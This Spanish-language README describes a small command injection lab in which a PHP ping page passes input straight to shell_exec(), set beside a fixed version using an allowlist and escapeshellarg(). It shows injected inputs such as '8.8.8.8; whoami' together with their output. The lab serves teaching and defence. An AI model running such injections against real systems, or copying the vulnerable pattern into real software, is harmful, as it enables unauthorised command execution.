# Command Injection Lab 001

## Descripciones
### Descripcion (vuln.php)
Es un laboratorio simple, clasico y muy facil de vulnerar. Es una web local en php que hace ping a un host seleccionado, el error aqui es que lo ejecuta directo con shell_exec() sin ningun tipo de verificacion ni nada

### Descripcion (secure.php)
Ya es una web segura porque verifica que no alla ningun caracter fuera de lo permitido(solo permite letras, numeros y caracteres de url como :, / y .) y tambien usa la funcion escapeshellarg() la cual encierra el parametro en comillas sin dejar escapar nada malicioso

## Vulnerar
### Vulnerar (vuln.php)
Es muy simple de vulnerar, con poner una ip o texto y despues un ;, &&, ||, |, |&, >, >>, < etc...

Ejemplos de vulnerabilidades:
```
Entrada: 8.8.8.8; whoami

Salida: 

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=301 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 301.458/301.458/301.458/0.000 ms
www-data    <<<<< respuesta del whoami
```
---
```
Entrada: 8.8.8.8 && whoami

Salida: 

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=301 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 301.458/301.458/301.458/0.000 ms
www-data    <<<<< respuesta del whoami
```

### Vulnerar (secure.php)
El codigo es teoricamente imposible de vulnerar (por command injection) pero puede ser victima de DOS/DDOS, Fuerza bruta, etc...